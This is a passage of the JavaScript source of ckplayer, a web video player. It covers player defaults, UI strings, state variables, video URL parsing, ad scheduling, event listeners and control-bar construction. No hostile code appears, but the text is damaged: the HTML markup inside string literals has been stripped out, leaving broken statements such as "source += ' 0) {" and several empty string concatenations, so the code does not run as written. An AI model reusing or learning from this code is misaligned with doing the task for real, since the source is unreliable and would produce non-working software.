false,//移动端h5显示控制栏 mobileAutoFull: true,//移动端是否默认全屏播放 playbackrate: 1,//默认倍速 h5container: '',//h5环境中使用自定义容器 debug: false,//是否开启调试模式 overspread:true,//是否让视频铺满播放器 //以下为广告相关配置 adfront: '', adfronttime: '', adfrontlink: '', adpause: '', adpausetime: '', adpauselink: '', adinsert: '', adinserttime: '', adinsertlink: '', inserttime: '', adend: '', adendtime: '', adendlink: '', advertisements: '' }; this.vars = {};//全局变量：语言配置 this.language = { volume: '音量：', play: '点击播放', pause: '点击暂停', full: '点击全屏', escFull: '退出全屏', mute: '点击静音', escMute: '取消静音', front: '上一集', next: '下一集', definition: '点击选择清晰度', playbackRate: '点击选择速度', subtitles: '点击选择字幕', error: '加载出错', adTime: '广告{$second}秒', skipAd: '跳过广告', skipAdTime: '{$second}秒后可跳过广告', adLink: '查看详情', noLoadShockwaveFlash:'您的浏览器不支持FlashPlayer插件或没有启用该插件', downLoadShockwaveFlash:'点击下载FlashPlayer插件' }; //全局变量：右键菜单：[菜单标题,类型(link:链接，default:灰色，function：调用函数，javascript:调用js函数),执行内容(包含链接地址，函数名称),[line(间隔线)]] this.contextMenu = [['ckplayer', 'link', 'http://www.ckplayer.com', '_blank'], ['version:X1', 'default', 'line']]; //全局变量：错误提示列表 this.errorList = [['000', 'Object does not exist'], ['001', 'Variables type is not a object'], ['002', 'Video object does not exist'], ['003', 'Video object format error'], ['004', 'Video object format error'], ['005', 'Video object format error'], ['006', '[error] does not exist '], ['007', 'Ajax error'], ['008', 'Ajax error'], ['009', 'Ajax object format error'], ['010', 'Ajax.status:[error]']]; //全局变量：HTML5变速播放的值数组/如果不需要可以设置成null this.playbackRateArr = [[0.5, '0.5倍'], [1, '正常'], [1.25, '1.25倍'], [1.5, '1.5倍'], [2, '2倍速'], [4, '4倍速']]; //全局变量：保存倍速 this.playbackRateTemp=1; //全局变量：HTML5默认变速播放的值 this.playbackRateDefault = 1; //全局变量：HTML5当前显示的字幕编号 this.subtitlesTemp=-1; //全局变量：定义logo this.logo = ''; //全局变量：是否加载了播放器 this.loaded = false; //全局变量：计时器，监听视频加载出错的状态 this.timerError = null; //全局变量：是否出错 this.error = false; //全局变量：出错地址的数组 this.errorUrl = []; //全局变量：计时器，监听全屏与非全屏状态 this.timerFull = null; //全局变量：是否全屏状态 this.full = false; //全局变量：计时器，监听当前的月/日 时=分=秒 this.timerTime = null; //全局变量：计时器，监听视频加载 this.timerBuffer = null; //全局变量：设置进度按钮及进度条是否跟着时间变化，该属性主要用来在按下进度按钮时暂停进度按钮移动和进度条的长度变化 this.isTimeButtonMove = true; //全局变量：进度栏是否有效，如果是直播，则不需要监听时间让进度按钮和进度条变化 this.isTimeButtonDown = false; //全局变量：用来模拟双击功能的判断 this.isClick = false; //全局变量：计时器，用来模拟双击功能的计时器 this.timerClick = null; //全局变量：计时器，旋转loading this.timerLoading = null; //全局变量：计时器，监听鼠标在视频上移动显示控制栏 this.timerCBar = null; //全局变量：播放视频时如果该变量的值大于0，则进行跳转后设置该值为0 this.needSeek = 0; //全局变量：当前音量 this.volume = 0; //全局变量：静音时保存临时音量 this.volumeTemp = 0; //全局变量/变量类型：Number/功能：当前播放时间 this.time = 0; //全局变量：定义首次调用 this.isFirst = true; //全局变量：是否使用HTML5-VIDEO播放 this.html5Video = true; //全局变量记录视频容器节点的x;y this.pdCoor = { x: 0, y: 0 }; //全局变量：判断当前使用的播放器类型，html5video或flashplayer this.playerType = ''; //全局变量：加载进度条的长度 this.loadTime = 0; //全局变量：body对象 this.body = document.body || document.documentElement; //全局变量：播放器 this.V = null; //全局变量：保存外部js监听事件数组 this.listenerJsArr = []; //全局变量：保存控制栏显示元素的总宽度 this.buttonLen = 0; //全局变量：保存控制栏显示元素的数组 this.buttonArr = []; //全局变量：保存按钮元素的宽 this.buttonWidth = {}; //全局变量：保存播放器上新增元件的数组 this.elementArr = []; //全局变量：保存播放器上弹幕的临时数组 this.elementTempArr = []; //全局变量：字幕内容 this.track = []; //全局变量：字幕索引 this.trackIndex = 0; //全局变量：当前显示的字幕内容 this.nowTrackShow = { sn: '' }; //全局变量：保存字幕元件数组 this.trackElement = []; //全局变量：将视频转换为图片 this.timerVCanvas = null; //全局变量：animate，缓动对象数组 this.animateArray = []; //全局变量：保存animate的元件 this.animateElementArray = []; //全局变量：保存需要在暂停时停止缓动的数组 this.animatePauseArray = []; //全局变量：预览图片加载状态/0=没有加载，1=正在加载，2=加载完成 this.previewStart = 0; //全局变量：预览图片容器 this.previewDiv = null; //全局变量：预览框 this.previewTop = null; //全局变量：预览框的宽 this.previewWidth = 120; //全局变量：预览图片容器缓动函数 this.previewTween = null; //全局变量：是否是m3u8格式，是的话则可以加载hls.js this.isM3u8 = false; //全局变量：保存提示点数组 this.promptArr = []; //全局变量：显示提示点文件的容器 this.promptElement = null; //全局变量：配置文件函数 this.ckplayerConfig = {}; //全局变量：控制栏是否显示 this.showFace = true; //全局变量：是否监听过h5的错误 this.errorAdd = false; //全局变量：是否发送了错误 this.errorSend = false; //全局变量：控制栏是否隐藏 this.controlBarIsShow = true; //全局变量，保存当前缩放比例 this.videoScale = 1; //全局变量：设置字体 this.fontFamily = '\"Microsoft YaHei\"; YaHei; \"\\5FAE\\8F6F\\96C5\\9ED1\"; SimHei; \"\\9ED1\\4F53\";Arial'; //全局变量：设置字幕的文字大小 this.trackFontSize=16; //全局变量：设置字幕的行距 this.trackLineHeight=30; //全局变量：记录第一次拖动进度按钮时的位置 this.timeSliderLeftTemp = 0; //全局变量：判断是否记录了总时间 this.durationSendJS = false; //全局变量：初始化广告分析是否结束设置 this.adAnalysisEnd = false; //全局变量：广告变量 this.advertisements = {}; //全局变量：是否是第一次播放视频 this.isFirstTimePlay = true; //全局变量：当前需要播放的广告类型 this.adType = ''; //全局变量：播放广告计数 this.adI = 0; //全局变量：要播放的临时地址 this.videoTemp = { src: '', source: '', currentSrc: '', loop: false }; //全局变量：当前要播放的广告组总时间 this.adTimeAllTotal = 0; //全局变量：肖前要播放的广告时间 this.adTimeTotal = 0; //全局变量：用来做倒计时 this.adCountDownObj = null; //全局变量：前置，中插，结尾广告是否已开始运行 this.adPlayStart = false; //全局变量：目前是否在播放广告 this.adPlayerPlay = false; //全局变量：当前广告是否暂停 this.adIsPause = false; //全局变量：视频广告是否静音 this.adVideoMute = false; //全局变量：是否需要记录当前播放的时间供广告播放结束后进行跳转 this.adIsVideoTime = false; //全局变量：后置广告是否播放 this.endAdPlay = false; //全局变量：暂停广告是否在显示 this.adPauseShow = false; //全局变量：是否需要重置广告以实现重新播放时再播放一次 this.adReset = false; //全局变量：记录鼠标在视频上点击时的坐标 this.videoClickXy={x:0,y:0}; //全局变量：是否在播放广告时播放过视频广告 this.adVideoPlay = false; if (obj) { this.embed(obj); } //全局变量：临时存储已加载时间的变量 this.loadTimeTemp=0; //全局变量，临时存储hls形式下首次加载时是否需要暂停或播放的判断 this.hlsAutoPlay=true; }; ckplayer.prototype = { /* 主要函数部分开始 主接口函数： 调用播放器需初始化该函数 */ embed: function(c) { //c:Object：是调用接口传递的属性对象 if (window.location.href.substr(0, 7) == 'file://') {//如果是使用的file协议打网页则弹出提示 alert('Please use the HTTP protocol to open the page'); return; } if (c == undefined || !c) { this.eject(this.errorList[0]); return; } if (typeof(c) != 'object') { this.eject(this.errorList[1]); } this.vars = this.standardization(this.varsConfig, c); if (!this.vars['mobileCkControls'] && this.isMobile()) { this.vars['flashplayer'] = false; this.showFace = false; } var videoString = this.vars['video']; if (!videoString) { this.eject(this.errorList[2]); return; } if (typeof(videoString) == 'string') { if (videoString.substr(0, 3) == 'CK:' || videoString.substr(0, 3) == 'CE:' || videoString.substr(8, 3) == 'CK:' || videoString.substr(8, 3) == 'CE:') { this.vars['flashplayer'] = true; } } if (typeof(videoString) == 'object') { if (videoString.length > 1) { if (videoString[0][0].substr(0, 3) == 'CK:' || videoString[0][0].substr(0, 3) == 'CE:' || videoString[0][0].substr(8, 3) == 'CK:' || videoString[0][0].substr(8, 3) == 'CE:') { this.vars['flashplayer'] = true; } } } if (this.vars['config']) { this.ckplayerConfig = eval(this.vars['config'] + '()'); } else { this.ckplayerConfig = ckplayerConfig(); } if ((!this.supportVideo() && this.vars['flashplayer'] != '') || (this.vars['flashplayer'] && this.uploadFlash()) || !this.isMsie()) { this.html5Video = false; this.getVideo(); } else if (videoString) { //判断视频数据类型 this.analysedVideoUrl(videoString); return this; } else { this.eject(this.errorList[2]); } }, /* 内部函数 根据外部传递过来的video开始分析视频地址 */ analysedVideoUrl: function(video) { var i = 0, y = 0; var thisTemp = this; this.VA = [];//定义全局变量VA：视频列表（包括视频地址，类型，清晰度说明） if (this.typeString(video) == 'string') { //如果是字符形式的则判断后缀进行填充 if (video.substr(0, 8) != 'website:') { this.VA = [[video, '', '', 0]]; var fileExt = this.getFileExt(video); switch (fileExt) { case '.mp4': this.VA[0][1] = 'video/mp4'; break; case '.ogg': this.VA[0][1] = 'video/ogg'; break; case '.webm': this.VA[0][1] = 'video/webm'; break; default: break; } this.getVideo(); } else { if (this.html5Video) { var ajaxObj = { url: video.substr(8), success: function(data) { if (data) { thisTemp.analysedUrl(data); } else { thisTemp.eject(thisTemp.errorList[5]); this.VA = video; thisTemp.getVideo(); } } }; this.ajax(ajaxObj); } else { this.VA = video; this.getVideo(); } } } else if(this.typeString(video)=='array'){//如果视频地址是数组 if (!this.isUndefined(typeof(video[0].length))) { //如果视频地址是二维数组 this.VA = video; } this.getVideo(); } else if(this.typeString(video)=='object'){ /* 如果video格式是对象形式，则分二种 如果video对象里包含type，则直接播放 */ if (!this.isUndefined(video['type'])) { this.VA.push([video['file'], video['type'], '', 0]); this.getVideo(); } else { this.eject(this.errorList[5]); } } else { this.eject(this.errorList[4]); } }, /* 对请求到的视频地址进行重新分析 */ analysedUrl: function(data) { this.vars = this.standardization(this.vars, data); if (!this.isUndefined(data['video'])) { this.vars['video'] = data['video']; } this.analysedVideoUrl(this.vars['video']); }, /* 内部函数 检查浏览器支持的视频格式，如果是则将支持的视频格式重新分组给播放列表 */ getHtml5Video: function() { var va = this.VA; var nva = []; var mobile = false; var video = document.createElement('video'); var codecs = function(type) { var cod = ''; switch (type) { case 'video/mp4': cod = 'avc1.4D401E, mp4a.40.2'; break; case 'video/ogg': cod = 'theora, vorbis'; break; case 'video/webm': cod = 'vp8.0, vorbis'; break; default: break; } return cod; }; var supportType = function(vidType, codType) { if (!video.canPlayType) { this.html5Video = false; return; } var isSupp = video.canPlayType(vidType + ';codecs=\"' + codType + '\"'); if (isSupp == '') { return false } return true; }; if (this.vars['flashplayer'] || !this.isMsie()) { this.html5Video = false; return; } if (this.isMobile()) { mobile = true; } for (var i = 0; i < va.length; i++) { var v = va[i]; if (v) { if (v[1] != '' && !mobile && supportType(v[1], codecs(v[1])) && v[0].substr(0, 4) != 'rtmp') { nva.push(v); } if ((this.getFileExt(v[0]) == '.m3u8' || this.vars['type'] == 'video/m3u8' || this.vars['type'] == 'm3u8' || v[1] == 'video/m3u8' || v[1] == 'm3u8') && this.vars['html5m3u8'] && !mobile) { this.isM3u8 = true; nva.push(v); } } } if (nva.length > 0) { this.VA = nva; } else { if (!mobile) { this.html5Video = false; } } }, /* 内部函数 根据视频地址开始构建播放器 */ getVideo: function() { var thisTemp = this; var v = this.vars; //如果存在广告字段则开始分析广告 if (!this.adAnalysisEnd && (v['adfront'] != '' || v['adpause'] != '' || v['adinsert'] != '' || v['adend'] != '' || v['advertisements'] != '')) { this.adAnalysisEnd = true; this.adAnalysis(); return; } //如果存在字幕则加载 if (this.V) { //如果播放器已存在，则认为是从newVideo函数发送过来的请求 this.changeVideo(); return; } if (this.vars['cktrack']) { this.loadTrack(); } if (this.supportVideo() && !this.vars['flashplayer']) { this.getHtml5Video(); //判断浏览器支持的视频格式 } var src = '', source = '', poster = '', loop = '', autoplay = '', track = ''; var video = v['video']; var i = 0; this.CD = this.getByElement(v['container']); volume = v['volume']; if (!this.CD) { this.eject(this.errorList[6], v['container']); return false; } //开始构建播放器容器 this.V = undefined; var thisPd = null; if (v['h5container'] != '') { thisPd = this.getByElement(v['h5container']); if (this.isUndefined(thisPd)) { thisPd = null; } } var isVideoH5 = null; //isUndefined thisPd if (v['playerID'] != '') { isVideoH5 = this.getByElement('#' + v['playerID']); if (this.isUndefined(isVideoH5)) { isVideoH5 = null; } } if (thisPd != null && isVideoH5 != null) { this.PD = thisPd; //PD:定义播放器容器对象全局变量 } else { var playerID = 'ckplayer' + this.randomString(); var playerDiv = document.createElement('div'); playerDiv.className = playerID; this.CD.innerHTML = ''; this.CD.appendChild(playerDiv); this.PD = this.getByElement(playerID); //PD:定义播放器容器对象全局变量 } this.css(this.CD, { backgroundColor: '#000000', overflow: 'hidden', position: 'relative' }); this.css(this.PD, { backgroundColor: '#000000', width: '100%', height: '100%', fontFamily: this.fontFamily }); if (this.html5Video) { //如果支持HTML5-VIDEO则默认使用HTML5-VIDEO播放器 //禁止播放器容器上鼠标选择文本 this.PD.onselectstart = this.PD.ondrag = function() { return false; }; //播放器容器构建完成并且设置好样式 //构建播放器 if (this.VA.length == 1) { this.videoTemp['src'] = decodeURIComponent(this.VA[0][0]); src = ' src=\"' + this.videoTemp['src'] + '\"'; } else { var videoArr = this.VA.slice(0); videoArr = this.arrSort(videoArr); for (i = 0; i < videoArr.length; i++) { var type = ''; var va = videoArr[i]; if (va[1]) { type = ' type=\"' + va[1] + '\"'; if (type == ' type=\"video/m3u8\"' || type == ' type=\"m3u8\"') { type = ''; } } source += ' 0) { this.needSeek = v['seek']; } if (v['track'] != null && v['cktrack'] == null) { var trackArr = v['track']; var trackDefault = ''; var defaultHave = false; for (i = 0; i < trackArr.length; i++) { var trackObj = trackArr[i]; if (trackObj['default'] && !defaultHave) { trackDefault = ' default'; defaultHave = true; } else { trackDefault = ''; } track += '' + source + ''; } else { html = ' -1) { if (this.vars['playbackrate'] < this.playbackRateArr.length) { this.playbackRateDefault = this.vars['playbackrate']; } this.V.playbackRate = this.playbackRateArr[this.playbackRateDefault][0]; //定义倍速 } } catch(error) {} this.css(this.V, { width: '100%', height: '100%' }); if (this.isM3u8) { var loadJsHandler = function() { thisTemp.embedHls(thisTemp.VA[0][0], v['autoplay']); }; this.loadJs(javascriptPath + 'hls/hls.min.js', loadJsHandler); } this.css(this.V, 'backgroundColor', '#000000'); //创建一个画布容器 if (this.config['videoDrawImage']) { var canvasID = 'vcanvas' + this.randomString(); var canvasDiv = document.createElement('div'); canvasDiv.className = canvasID; this.PD.appendChild(canvasDiv); this.MD = this.getByElement(canvasID); //定义画布存储容器 this.css(this.MD, { backgroundColor: '#000000', width: '100%', height: '100%', position: 'absolute', display: 'none', cursor: 'pointer', left: '0px', top: '0px', zIndex: '10' }); var cvid = 'ccanvas' + this.randomString(); this.MD.innerHTML = this.newCanvas(cvid, this.PD.offsetWidth, this.PD.offsetHeight); this.MDC = this.getByElement(cvid + '-canvas'); this.MDCX = this.MDC.getContext('2d'); } this.playerType = 'html5video'; //播放器构建完成并且设置好样式 //建立播放器的监听函数，包含操作监听及事件监听 this.addVEvent(); //根据清晰度的值构建清晰度切换按钮 if (this.showFace) { this.definition(); if (!this.vars['live'] && this.playbackRateArr && this.vars['playbackrate'] > -1) { this.playbackRate(); } if (v['autoplay']) { this.loadingStart(true); } this.subtitleSwitch(); } this.playerLoad(); } else { //如果不支持HTML5-VIDEO则调用flashplayer this.embedSWF(); } }, /* 分析广告数据 */ adAnalysis: function() { var thisTemp = this; var v = this.vars; var isAdvShow = []; var i = 0; if (v['advertisements'] != '' && v['advertisements'].substr(0, 8) == 'website:') { var ajaxObj = { url: v['advertisements'].substr(8), success: function(data) { if (data) { var newData = {}; var val = null; //对广告进行分析 try { if (!thisTemp.isUndefined(data['front']) || !thisTemp.isUndefined(data['pause']) || !thisTemp.isUndefined(data['end']) || !thisTemp.isUndefined(data['insert']) || !thisTemp.isUndefined(data['other'])) { val = thisTemp.arrayDel(data['front']); if (!thisTemp.isUndefined(val)) { newData['front'] = val; } val = thisTemp.arrayDel(data['pause']); if (!thisTemp.isUndefined(val)) { newData['pause'] = val; } val = thisTemp.arrayDel(data['insert']); if (!thisTemp.isUndefined(val)) { newData['insert'] = val; if (!thisTemp.isUndefined(data['inserttime'])) { newData['inserttime'] = thisTemp.arrayInt(data['inserttime']); isAdvShow = []; for (i = 0; i < newData['inserttime'].length; i++) { isAdvShow.push(false); } newData['insertPlay'] = isAdvShow; } } val = thisTemp.arrayDel(data['end']); if (!thisTemp.isUndefined(val)) { newData['end'] = val; } val = thisTemp.arrayDel(data['other']); if (!thisTemp.isUndefined(val)) { newData['other'] = val; isAdvShow = []; var arrTemp = []; for (i = 0; i < val.length; i++) { isAdvShow.push(false); arrTemp.push(parseInt('0' + val[i]['startTime'])); } newData['othertime'] = arrTemp; newData['otherPlay'] = isAdvShow; } } } catch(event) { thisTemp.log(event) } thisTemp.advertisements = newData; //对广告进行分析结束 } thisTemp.getVideo(); } }; this.ajax(ajaxObj); } else { //根据广告分析 this.adAnalysisOne('front', 'adfront', 'adfronttime', 'adfrontlink', 'adfronttype'); this.adAnalysisOne('pause', 'adpause', 'adpausetime', 'adpauselink', 'adpausetype'); this.adAnalysisOne('insert', 'adinsert', 'adinserttime', 'adinsertlink', 'adinserttype'); this.adAnalysisOne('end', 'adend', 'adendtime', 'adendlink', 'adendtype'); if (!this.isUndefined(this.advertisements['insert'])) { if (!this.isUndefined(v['inserttime'])) { thisTemp.advertisements['inserttime'] = v['inserttime']; } } if (!this.isUndefined(thisTemp.advertisements['inserttime'])) { thisTemp.advertisements['inserttime'] = thisTemp.arrayInt(thisTemp.advertisements['inserttime']); isInsert = []; for (i = 0; i < thisTemp.advertisements['inserttime'].length; i++) { isInsert.push(false); } thisTemp.advertisements['insertPlay'] = isInsert; } thisTemp.getVideo(); } }, /* 将广告数组数据里不是视频和图片的去除 */ arrayDel: function(arr) { if(this.isUndefined(arr)){ return arr; } if (arr.length == 0) { return null; } var newArr = []; for (var i = 0; i < arr.length; i++) { var type = arr[i]['type']; if (type == 'mp4' || type == 'mov' || this.isStrImage(type)) { newArr.push(arr[i]); } } if (newArr.length > 0) { return newArr; } return null; }, /*分析单个类型的广告*/ adAnalysisOne: function(adType, adName, adTime, adLink, adStype) { var v = this.vars; if (this.isUndefined(v[adName])) { v[adName] = ''; } if (this.isUndefined(v[adTime])) { v[adTime] = ''; } if (this.isUndefined(v[adLink])) { v[adLink] = ''; } if (this.isUndefined(v[adStype])) { v[adStype] = ''; } if (v[adName] != '') { var adList = []; var ad = v[adName].split(','); var adtime = v[adTime].split(','); var adlink = v[adLink].split(','); var adstype = v[adStype].split(','); var i = 0; if (ad.length > 0) { var adLinkLen = adlink.length, adTimeLen = adtime.length; if (v[adLink] == '') { adLinkLen = 0; adlink = []; } if (v[adTime] == '') { adTimeLen = 0; adtime = []; } if (adLinkLen < ad.length) { for (i = adLinkLen; i < ad.length; i++) { adlink.push(''); } } if (adTimeLen < ad.length) { for (i = adTimeLen; i < ad.length; i++) { adtime.push(''); } } var adstypeLen = adstype.length; if (v[adStype] == '') { adstypeLen = 0; adstype = []; } if (adstypeLen < ad.length) { for (i = adstypeLen; i < ad.length; i++) { adstype.push(this.getFileExt(ad[i]).replace('.', '')); } } for (i = 0; i < ad.length; i++) { var type = adstype[i]; if (type == 'mp4' || type == 'mov' || this.isStrImage(type)) { var obj = { file: ad[i], type: type, time: parseInt(adtime[i]) > 0 ? parseInt(adtime[i]) : this.ckplayerConfig['style']['advertisement']['time'], link: adlink[i] }; adList.push(obj); } } if (this.isUndefined(this.advertisements)) { this.advertisements = {}; } if (adList.length > 0) { this.advertisements[adType] = adList; } } } }, /* 内部函数 发送播放器加载成功的消息 */ playerLoad: function() { var thisTemp = this; if (this.isFirst) { this.isFirst = false; setTimeout(function() { thisTemp.loadedHandler(); },1); } }, /* 内部函数 建立播放器的监听函数，包含操作监听及事件监听 */ addVEvent: function() { var thisTemp = this; var duration=0; //监听视频单击事件 var eventVideoClick = function(event) { thisTemp.videoClickXy={x:event.clientX,y:event.clientY}; thisTemp.videoClick(); }; this.addListenerInside('click', eventVideoClick); this.addListenerInside('click', eventVideoClick, this.MDC); //延迟计算加载失败事件 this.timerErrorFun(); //监听视频加载到元数据事件 var eventJudgeIsLive = function(event) { thisTemp.sendJS('loadedmetadata'); if (typeof(thisTemp.V.duration) == 'number' && thisTemp.V.duration > 1) { duration = thisTemp.V.duration; if(!duration){ if(thisTemp.vars['duration']>0){ duration=thisTemp.vars['duration']; } } if(thisTemp.vars['forceduration']>0){ duration=thisTemp.vars['forceduration']; } thisTemp.sendJS('duration', duration); thisTemp.formatInserttime(duration); if (thisTemp.adPlayerPlay) { thisTemp.advertisementsTime(duration + 1); } thisTemp.durationSendJS = true; } thisTemp.judgeIsLive(); }; this.addListenerInside('loadedmetadata', eventJudgeIsLive); //监听视频播放事件 var eventPlaying = function(event) { thisTemp.playingHandler(); thisTemp.sendJS('play'); thisTemp.sendJS('paused', false); if (!thisTemp.durationSendJS && typeof(thisTemp.V.duration) == 'number' && thisTemp.V.duration > 0) { duration = thisTemp.V.duration; if(!duration){ if(thisTemp.vars['duration']>0){ duration=thisTemp.vars['duration']; } } if(thisTemp.vars['forceduration']>0){ duration=thisTemp.vars['forceduration']; } thisTemp.durationSendJS = true; thisTemp.sendJS('duration', duration); thisTemp.formatInserttime(duration); } }; this.addListenerInside('playing', eventPlaying); //监听视频暂停事件 var eventPause = function(event) { thisTemp.pauseHandler(); thisTemp.sendJS('pause'); thisTemp.sendJS('paused', true); }; this.addListenerInside('pause', eventPause); //监听视频播放结束事件 var eventEnded = function(event) { thisTemp.endedHandler(); }; this.addListenerInside('ended', eventEnded); //监听视频播放时间事件 var eventTimeupdate = function(event) { if (thisTemp.timerLoading != null) { thisTemp.loadingStart(false); } if (thisTemp.time) { if (!thisTemp.adPlayerPlay) { thisTemp.sendJS('time', thisTemp.time); //监听中间插入广告是否需要播放 if (!thisTemp.isUndefined(thisTemp.advertisements['insert'])) { thisTemp.checkAdInsert(thisTemp.time); } //监听其它广告 if (!thisTemp.isUndefined(thisTemp.advertisements['other'])) { thisTemp.checkAdOther(thisTemp.time); } if (thisTemp.time < 3 && thisTemp.adReset) { thisTemp.adReset = false; thisTemp.endedAdReset(); } } else { //如果是广告则进行广告倒计时 thisTemp.adPlayerTimeHandler(thisTemp.time); } } }; this.addListenerInside('timeupdate', eventTimeupdate); //监听视频缓冲事件 var eventWaiting = function(event) { thisTemp.loadingStart(true); }; this.addListenerInside('waiting', eventWaiting); //监听视频seek开始事件 var eventSeeking = function(event) { thisTemp.sendJS('seek', 'start'); }; this.addListenerInside('seeking', eventSeeking); //监听视频seek结束事件 var eventSeeked = function(event) { thisTemp.seekedHandler(); thisTemp.sendJS('seek', 'ended'); }; this.addListenerInside('seeked', eventSeeked); //监听视频音量 var eventVolumeChange = function(event) { try { thisTemp.volumechangeHandler(); thisTemp.sendJS('volume', thisTemp.volume || thisTemp.V.volume); } catch(event) {} }; this.addListenerInside('volumechange', eventVolumeChange); //监听全屏事件 var eventFullChange = function(event) { var fullState = document.fullScreen || document.mozFullScreen || document.webkitIsFullScreen; thisTemp.sendJS('full', fullState); }; this.addListenerInside('fullscreenchange', eventFullChange); this.addListenerInside('webkitfullscreenchange', eventFullChange); this.addListenerInside('mozfullscreenchange', eventFullChange); //建立界面 if (this.showFace) { this.interFace(); } }, /* 内部函数 重置界面元素 */ resetPlayer: function() { this.timeTextHandler(); if (this.showFace) { this.timeProgress(0, 1); //改变时间进度条宽 this.changeLoad(0); this.initPlayPause(); //判断显示播放或暂停按钮 this.definition(); //构建清晰度按钮 this.showFrontNext(); //构建上一集下一集按钮 this.deletePrompt(); //删除提示点 this.deletePreview(); //删除预览图 this.trackHide(); //重置字幕 this.resetTrack(); this.trackElement = []; this.track = []; } }, /* 内部函数 构建界面元素 */ interFace: function() { this.showFace = true; var thisTemp = this; var html = ''; //控制栏内容 var i = 0; var bWidth = 38,//按钮的宽 bHeight = 38; //按钮的高 var bBgColor = '#FFFFFF',//按钮元素默认颜色 bOverColor = '#0782F5'; //按钮元素鼠标经过时的颜色 var timeInto = this.formatTime(0) + ' / ' + this.formatTime(this.vars['duration']); //时间显示框默认显示内容 var randomS = this.randomString(10); //获取一个随机字符串 /* 以下定义界面各元素的ID，统一以ID结束 */ var controlBarBgID = 'controlbgbar' + randomS,//控制栏背景 controlBarID = 'controlbar' + randomS,//控制栏容器 timeProgressBgID = 'timeprogressbg' + randomS,//播放进度条背景 loadProgressID = 'loadprogress' + randomS,//加载进度条 timeProgressID = 'timeprogress' + randomS,//播放进度条 timeBOBGID = 'timebobg' + randomS,//播放进度按钮容器，该元素为一个透明覆盖在播放进度条上 timeBOID = 'timebo' + randomS,//播放进度可拖动按钮外框 timeBWID = 'timebw' + randomS,//播放进度可拖动按钮内框 timeTextID = 'timetext' + randomS,//时间文本框 playID = 'play' + randomS,//播放按钮 pauseID = 'pause' + randomS,//暂停按钮 frontID = 'front' + randomS,//前一集按钮 nextID = 'next' + randomS,//下一集按钮 fullID = 'full' + randomS,//全屏按钮 escFullID = 'escfull' + randomS,//退出全屏按钮 muteID = 'mute' + randomS,//静音按钮 escMuteID = 'escmute' + randomS,//取消静音按钮 volumeID = 'volume' + randomS,//音量调节框容器 volumeDbgID = 'volumedbg' + randomS,//音量调节框容器背景 volumeBgID = 'volumebg' + randomS,//音量调节框背景层 volumeUpID = 'volumeup' + randomS,//音量调节框可变宽度层 volumeBOID = 'volumebo' + randomS,//音量调节按钮外框 volumeBWID = 'volumebw' + randomS,//音量调节按钮内框 definitionID = 'definition' + randomS,//清晰度容器 definitionPID = 'definitionp' + randomS,//清晰度列表容器 playbackRateID = 'playbackrate' + randomS,//倍速容器 playbackRatePID = 'playbackratep' + randomS,//倍速列表容器 subtitlesID = 'subtitles' + randomS,//多字幕容器 subtitlesPID = 'subtitlesp' + randomS,//多字幕列表容器 promptBgID = 'promptbg' + randomS,//提示框背景 promptID = 'prompt' + randomS,//提示框 dlineID = 'dline' + randomS,//分隔线共用前缀 menuID = 'menu' + randomS,//右键容器 pauseCenterID = 'pausecenter' + randomS,//中间暂停按钮 loadingID = 'loading' + randomS,//缓冲 errorTextID = 'errortext' + randomS,//错误文本框 logoID = 'logo' + randomS,//logo adBackgroundID = 'background' + randomS,//广告背景图片 adElementID = 'adelement' + randomS,//广告容器 adBarID = 'adBar' + randomS,//广告顶部倒计时，跳过广告，静音按钮容器 adSkipID = 'adskip' + randomS,//跳过广告按钮 adTimeID = 'adtime' + randomS,//倒计时按钮 adLinkID = 'adlink' + randomS,//广告链接按钮 adMuteID = 'admute' + randomS,//广告静音按钮 adEscMuteID = 'adescmute' + randomS,//广告取消静音按钮 adPauseCloseID = 'adpauseclose' + randomS; //暂停广场的关闭按钮 /* 构建一些PD（播放器容器）里使用的元素 */ var controlBarBg = document.createElement('div'), controlBar = document.createElement('div'), timeProgressBg = document.createElement('div'), timeBoBg = document.createElement('div'), pauseCenter = document.createElement('div'), errorText = document.createElement('div'), promptBg = document.createElement('div'), prompt = document.createElement('div'), menuDiv = document.createElement('div'), definitionP = document.createElement('div'), playbackrateP = document.createElement('div'), subtitlesP = document.createElement('div'), loading = document.createElement('div'), logo = document.createElement('div'), adBackground = document.createElement('div'), adElement = document.createElement('div'), adBar = document.createElement('div'), adLink = document.createElement('div'), adPauseClose = document.createElement('div'); /* 定义各节点的样式 */ controlBarBg.className = controlBarBgID; controlBar.className = controlBarID; timeProgressBg.className = timeProgressBgID; timeBoBg.className = timeBOBGID; promptBg.className = promptBgID; prompt.className = promptID; menuDiv.className = menuID; definitionP.className = definitionPID; playbackrateP.className = playbackRatePID; subtitlesP.className = subtitlesPID; pauseCenter.className = pauseCenterID; loading.className = loadingID; logo.className = logoID; errorText.className = errorTextID; adBackground.className = adBackgroundID; adElement.className = adElementID; adBar.className = adBarID; adLink.className = adLinkID; adPauseClose.className = adPauseCloseID; /* 加载节点到播放器容器中 */ this.PD.appendChild(controlBarBg); this.PD.appendChild(controlBar); this.PD.appendChild(timeProgressBg); this.PD.appendChild(timeBoBg); this.PD.appendChild(promptBg); this.PD.appendChild(prompt); this.PD.appendChild(definitionP); this.PD.appendChild(playbackrateP); this.PD.appendChild(subtitlesP); this.PD.appendChild(pauseCenter); this.PD.appendChild(loading); this.PD.appendChild(errorText); this.PD.appendChild(logo); this.PD.appendChild(adBackground); this.PD.appendChild(adElement); this.PD.appendChild(adBar); this.PD.appendChild(adLink); this.PD.appendChild(adPauseClose); this.body.appendChild(menuDiv); if (this.vars['live']) { //如果是直播，时间显示文本框里显示当前系统时间 timeInto = this.getNowDate(); } /* 构建控制栏的内容 */ html += '' + this.newCanvas(playID, bWidth, bHeight) + ''; //播放按钮 html += '' + this.newCanvas(pauseID, bWidth, bHeight) + ''; //暂停按钮 html += ''; //分隔线 html += '' + this.newCanvas(frontID, bWidth, bHeight) + ''; //前一集按钮 html += ''; //分隔线 html += '' + this.newCanvas(nextID, bWidth, bHeight) + ''; //下一集按钮 html += ''; //分隔线 html += '' + timeInto + ''; //时间文本 html += '' + this.newCanvas(fullID, bWidth, bHeight) + ''; //全屏按钮 html += '' + this.newCanvas(escFullID, bWidth, bHeight) + ''; //退出全屏按钮 html += ''; //分隔线 html += ''; //清晰度容器 html += ''; //分隔线 html += ''; //倍速 html += ''; //分隔线 html += ''; //字幕 html += ''; //分隔线 html += ''; //音量调节框,音量调节按钮 html += '' + this.newCanvas(muteID, bWidth, bHeight) + ''; //静音按钮 html += '' + this.newCanvas(escMuteID, bWidth, bHeight) + ''; //退出静音按钮 html += ''; //分隔线 